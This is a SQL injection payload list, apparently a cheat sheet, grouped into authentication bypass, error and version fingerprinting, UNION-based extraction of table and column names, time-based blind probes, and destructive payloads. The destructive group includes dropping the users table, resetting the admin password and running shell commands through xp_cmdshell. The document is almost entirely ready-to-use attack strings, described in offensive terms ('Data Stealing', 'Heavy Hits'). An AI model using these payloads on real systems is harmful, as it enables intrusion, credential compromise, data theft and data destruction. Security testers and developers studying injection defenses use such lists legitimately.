1. Authentication Bypass (The Login Killers)
These are designed to make the password check always return TRUE.

' OR 1=1 --

" OR 1=1 --

admin' --

admin' #

' OR '1'='1

' OR TRUE --

" OR TRUE --

' OR 1=1 LIMIT 1 -- (Bypasses "too many results" errors)

' OR 'a'='a

') OR ('1'='1

2. Fingerprinting & Errors (The "Testing" Phase)
Used to see how the database reacts and what version it's running.
11. ' (The classic single quote to force an error)
12. '' (Double quote)
13. '; (The semicolon test)
14. ') (The parenthesis break)
15. @@version (Checks SQL Server/MySQL version)
16. AND 1=1 (Tests if the page loads normally)
17. AND 1=2 (Tests if the page content disappears)

3. UNION-Based (Data Stealing)
These "join" your malicious query to the original one to leak hidden data.
18. ' UNION SELECT NULL --
19. ' UNION SELECT NULL, NULL --
20. ' UNION SELECT 1,2,3 --
21. ' UNION SELECT @@version, user(), database() --
22. ' UNION SELECT table_name, NULL FROM information_schema.tables --
23. ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --

4. Blind & Time-Based (The "Silent" Attacks)
Used when the page doesn't show errors. You look for a delay in the page loading.
24. '; WAITFOR DELAY '0:0:5' -- (SQL Server)
25. ' OR SLEEP(5) -- (MySQL)
26. ' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) -- (Advanced MySQL)
27. '; pg_sleep(5) -- (PostgreSQL)

5. Destructive & Administrative (The "Heavy" Hits)
These are used to modify or delete data entirely.
28. '; DROP TABLE users --
29. '; UPDATE users SET password='hacked123' WHERE username='admin' --
30. '; EXEC xp_cmdshell 'net user' -- (SQL Server command execution)